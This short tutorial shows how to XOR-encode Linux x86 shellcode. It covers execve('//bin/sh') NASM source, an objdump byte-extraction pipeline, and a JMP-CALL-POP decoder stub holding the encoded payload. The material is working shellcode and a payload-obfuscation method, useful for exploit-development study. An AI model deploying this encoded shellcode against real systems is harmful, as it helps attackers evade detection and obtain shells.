# XOR Encoder

## Basic XOR Encoding/Decoding
```ASM
(A XOR B) XOR B = A
```

## XOR Encoding Process
#### 1) Create execve_04_sh_stack.nasm file
```ASM
global _start

section .text

_start:

	xor eax, eax			; Preparing Nulls in EAX register
	push eax			; Pushing the first Null DWORD
	
	push 0x68732f6e			; //bin/sh in reverse order
	push 0x69622f2f
	
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	
	; syscall()
	mov al, 0xb
	int 0x80
```

#### 2) Compile it
```bash
$ nasm -f elf32 -o execve_04_sh_stack execve_04_sh_stack.nasm
$ ld -o execve_04_sh_stack execve_04_sh_stack.o
```

#### 3) Extract shellcode from the binary
```bash
# This will only outputs the shellcode with copy and paste friendly format
# https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump

objdump -d ./PROGRAM | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d ' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
```

#### 4) XOR the extracted shellcode
```bash
https://github.com/bigb0sss/XOREncoder

./XOREncoder.py -s "<Shellcode>" -k "<Key>"
```

#### 5) Create a NASM file with XOR encoded shellcode
```asm
global _start

section .text

_start:

        jmp short call_decoder        ; JMP to "call_decoder" 

decoder:

        pop esi                       ; POPing "shellcode" on the ESI register 
        xor ecx, ecx                  ; Zero out ECX
        mov cl, 25                    ; Moving 25 (Lenght of the "shellcode") to C low
      
decode_loop:

        xor byte [esi], 0xAA          ; XORing wiht Key (= 0xAA)
        inc esi                       ; Increase ESI by one
        loop decode_loop              ; Looping "decode_loop" for 25 time
        jmp short shellcode           ; JMP to the decoded  "shellcode"

call_decoder:

      call decoder                    ; CALL "decoder"
      shellcode: db 0x9b, 0x6a, 0xfa, 0xc2, 0x85, 0x85, 0xd9, 0xc2, 0xc2, 0x85, 0xc8, 0xc3, 0xc4, 0x23, 0x49, 0xfa, 0x23, 0x48, 0xf9, 0x23, 0x4b, 0x1a, 0xa1, 0x67, 0x2a
```

#### 6) Compile it
```bash
$ nasm -f elf32 -o xor_01_sh_loop xor_01_sh_loop.nasm
$ ld -o xor_01_sh_loop xor_01_sh_loop.o
```

